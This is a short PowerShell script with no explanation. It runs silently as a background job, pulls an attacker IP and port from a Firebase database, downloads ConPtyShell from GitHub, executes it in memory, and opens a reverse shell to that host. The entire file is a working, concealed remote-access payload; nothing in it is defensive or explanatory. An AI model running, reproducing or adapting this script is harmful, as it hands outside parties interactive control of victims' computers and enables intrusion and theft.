Start-Job {
    $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
    $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json)"

    IEX(
        IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
    )

    Invoke-ConPtyShell "$ip" "$port"
} | Out-Null